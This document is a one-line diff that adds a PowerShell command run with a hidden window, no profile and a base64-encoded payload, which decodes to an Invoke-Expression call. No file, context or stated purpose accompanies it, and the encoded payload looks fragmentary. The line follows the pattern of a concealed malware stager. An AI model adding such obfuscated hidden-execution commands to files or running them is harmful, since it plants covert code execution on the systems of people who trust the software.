@@ -1,0 +1,1 @@
+powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AYwApAA==
